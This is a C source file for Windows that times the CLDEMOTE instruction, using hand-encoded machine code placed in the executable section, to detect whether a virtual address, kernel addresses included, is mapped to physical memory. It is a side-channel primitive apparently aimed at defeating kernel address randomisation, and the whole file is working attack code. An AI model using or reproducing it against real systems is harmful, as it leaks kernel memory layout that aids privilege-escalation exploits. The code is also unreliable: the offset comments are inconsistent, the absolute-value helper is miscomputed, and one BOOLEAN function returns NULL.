#include "CLDEMOTE.h"

#pragma code_seg( push, ".text" )
__declspec( allocate( ".text" ) ) UINT8 MeasureDemote_Data[ ] =
{ 
	/*0x00:*/ 0x53,                   //push rbx
	/*0x01:*/ 0x49, 0x89, 0xC8,       //mov  r8,  rcx
	/*0x04:*/ 0x0F, 0xAE, 0xF0,       //mfence
	/*0x07:*/ 0x0F, 0x01, 0xF9,       //rdtscp
	/*0x0A:*/ 0x49, 0x89, 0xC1,       //mov  r9,  rax
	/*0x0D:*/ 0x48, 0x31, 0xC0,       //xor  rax, rax
	/*0x10:*/ 0x0F, 0xA2,             //cpuid
	/*0x12:*/ 0x41, 0x0F, 0x1C, 0x00, //cldemote byte ptr[r8]
	/*0x16:*/ 0x41, 0x0F, 0x1C, 0x00, //cldemote byte ptr[r8]
	/*0x1A:*/ 0x41, 0x0F, 0x1C, 0x00, //cldemote byte ptr[r8]
	/*0x1D:*/ 0x41, 0x0F, 0x1C, 0x00, //cldemote byte ptr[r8]
	/*0x22:*/ 0x41, 0x0F, 0x1C, 0x00, //cldemote byte ptr[r8]
	/*0x26:*/ 0x41, 0x0F, 0x1C, 0x00, //cldemote byte ptr[r8]
	/*0x2A:*/ 0x41, 0x0F, 0x1C, 0x00, //cldemote byte ptr[r8]
	/*0x2D:*/ 0x41, 0x0F, 0x1C, 0x00, //cldemote byte ptr[r8]
	/*0x32:*/ 0x41, 0x0F, 0x1C, 0x00, //cldemote byte ptr[r8]
	/*0x36:*/ 0x41, 0x0F, 0x1C, 0x00, //cldemote byte ptr[r8]
	/*0x3A:*/ 0x0F, 0xA2,             //cpuid
	/*0x3C:*/ 0x0F, 0x01, 0xF9,       //rdtscp
	/*0x3F:*/ 0x0F, 0xAE, 0xF0,       //mfence
	/*0x42:*/ 0x4C, 0x29, 0xC8,       //sub  rax, r9
	/*0x45:*/ 0x5B,                   //pop  rbx
	/*0x46:*/ 0xC3                    //ret
};
#pragma code_seg( pop )

__declspec( align( 8 ) )
typedef struct _CLDEMOTE_DELTAS
{
	//
	// Measurement delta for a virtual address that is guaranteed to be mapped to physical memory
	//
	UINT32 DeltaValid;
	//
	// Measurement delta for a virtual address that is guaranteed to not be mapped to physical memory
	//
	UINT32 DeltaInvalid;
	//
	// Measurement delta for a virtual address for which we are unsure
	// whether or not it is mapped to physical memory
	//
	UINT32 DeltaTest;
}CLDEMOTE_DELTAS, *PCLDEMOTE_DELTAS;

UINT32
( *MeasureDemote )(
	_In_ LPVOID Address
	) = ( decltype( MeasureDemote ) )&MeasureDemote_Data;

FORCEINLINE
UINT32
i32abs( 
	_In_ UINT32 Value 
	)
{
	if ( Value & 0x80000000 ) {
		 return Value = ( ~1 - Value ) + 1;
	}

	return Value;
}

BOOLEAN
AreDeltasAccurate( 
	_In_ PCLDEMOTE_DELTAS Deltas 
	)
{
	UINT32 Difference = Deltas->DeltaInvalid - Deltas->DeltaValid;

	//
	// If the memory translation occured for both the mapped address and the invalid/unmapped address,
	// The measurement delta for the latter delta should always be substantially larger. 
	//
	if ( Difference & ( 1 << 31 ) )
		return FALSE;

	//
	// If the difference between the two deltas is too small, 
	// we can also assume the instruction(s) retired too early for comfort
	//
	if ( Difference < 200 )
		return FALSE;

	//
	// If the measurement delta for our test address is too far from both of the reference deltas,
	// we deem the measurement invalid as well
	//
	if ( i32abs( Deltas->DeltaInvalid - Deltas->DeltaTest ) > 50 &&
		 i32abs( Deltas->DeltaValid   - Deltas->DeltaTest ) > 50 )
		return FALSE;

	return TRUE;
}

BOOLEAN
GetLowestDemoteDeltas(
	_In_  LPVOID           Address,
	_Out_ PCLDEMOTE_DELTAS Data
	)
{
	//
	// Obtain an address that is guaranteed to be valid
	//
	LPVOID ValidRegion = GetModuleHandleA( "NTDLL.DLL" );

	if ( Data == NULL ) {
		return NULL;
	}

	RtlZeroMemory( Data, sizeof( CLDEMOTE_DELTAS ) );

	//
	// Keep performing measurements until we have a tangible result
	//
	while ( AreDeltasAccurate( Data ) == FALSE )
	{
		//
		// Fill all deltas with MAXUINT32
		//
		RtlFillMemory( Data, sizeof( CLDEMOTE_DELTAS ), 0xFF );

		for ( UINT32 i = CLDEMOTE_MEASUREMENT_SAMPLE_COUNT; i--; )
		{ 
			//
			// Obtain a measurement for an invalid address, a valid one, and the one we want to check
			//
			UINT32 DTValid   = MeasureDemote( ValidRegion ),
				   DTInvalid = MeasureDemote( NULL ),
				   DTUnknown = MeasureDemote( Address );

			//
			// Retrieve the smallest delta from the measurements
			//
			if ( DTValid < Data->DeltaValid )
				Data->DeltaValid = DTValid;

			if ( DTInvalid < Data->DeltaInvalid )
				Data->DeltaInvalid = DTInvalid;

			if ( DTUnknown < Data->DeltaTest )
				Data->DeltaTest = DTUnknown;
			//
		} 
	}

	return TRUE;
}

BOOLEAN
IsMappedToPhysicalPage(
	_In_ LPVOID VirtualAddress
	)
{
	LPVOID          ValidAddress = GetModuleHandleA( "NTDLL.DLL" );
	INT32           CpuidRegs[ 4 ];
	CLDEMOTE_DELTAS Deltas;

	//
	// Canonical check. The 16 most significant bits should all either be 1 or 0 (48-bit virtual addressing)
	//
	if ( ( ( UINT64 )VirtualAddress & 0xFFFF000000000000 ) != 0xFFFF000000000000 &&
		 ( ( UINT64 )VirtualAddress & 0xFFFF000000000000 ) != NULL ) 
	{
		return FALSE;
	}

	//
	// Obtain the lowest measurements for a null pointer and our virtual address
	//
	GetLowestDemoteDeltas( VirtualAddress, &Deltas );

	return ( INT32 )( Deltas.DeltaInvalid - Deltas.DeltaTest ) > 100;
}
